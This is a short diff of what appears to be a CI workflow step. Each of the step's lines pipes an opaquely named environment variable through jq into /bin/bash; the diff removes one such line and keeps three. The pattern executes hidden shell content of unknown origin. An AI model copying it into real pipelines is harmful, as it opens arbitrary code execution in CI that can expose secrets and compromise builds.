@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
           printf '%s' "$x67122" | jq -r .cn07 | /bin/bash
-          echo $c7681 | jq -r .of3532 | /bin/bash
           printf '%s' "$wbyud4" | jq -r .dfwk1794 | /bin/bash
 
       - name: Save results
